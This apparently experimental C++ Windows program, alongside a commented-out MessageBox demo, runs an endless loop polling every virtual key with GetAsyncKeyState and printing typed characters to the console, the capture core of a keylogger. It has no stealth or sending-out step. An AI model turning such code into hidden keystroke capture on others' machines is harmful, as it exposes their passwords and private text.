#include <iostream>
#include <Windows.h>

int main()
{
	/*
	int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
	int code = MessageBoxA(NULL, "cucc\rtest","title", MB_YESNO | MB_ICONQUESTION);

	switch (code)
	{
	case IDYES:
		std::cout << "Clicked OK";
		MessageBoxA(NULL, "Clicked OK", "OK", MB_OK | MB_ICONASTERISK);
		break;
	case IDNO:
		std::cout << "Clicked CANCEL";
		MessageBoxA(NULL, "Clicked CANCEL", "CANCEL", MB_OK | MB_ICONHAND);
		break;
	default:
		break;
	} */
	while (true)
	{
		for (int i = 0; i < 256; i++) {
			if (GetAsyncKeyState(i) & 0b1) {
				BYTE keyboardState[256];
				if (!GetKeyboardState(keyboardState)) {
					std::cerr << "GetKeyboardState failed!" << std::endl;
					continue;
				}

				WCHAR unicodeBuffer[2];
				HKL keyboardLayout = GetKeyboardLayout(0);
				int scanCode = MapVirtualKey(i, MAPVK_VK_TO_VSC);

				int res = ToUnicodeEx(i, scanCode, keyboardState, unicodeBuffer, 2, 0, keyboardLayout);
				
				if (GetAsyncKeyState(16) || GetAsyncKeyState(160)) {
					unicodeBuffer[0] = towupper(unicodeBuffer[0]);
				}

				if (i != 16 && i != 160) {
					if (i == 13) {
						std::cout << "\n";
					}
					std::wcout << unicodeBuffer[0];
					
				}
			}
		}
	}



	return 0;
}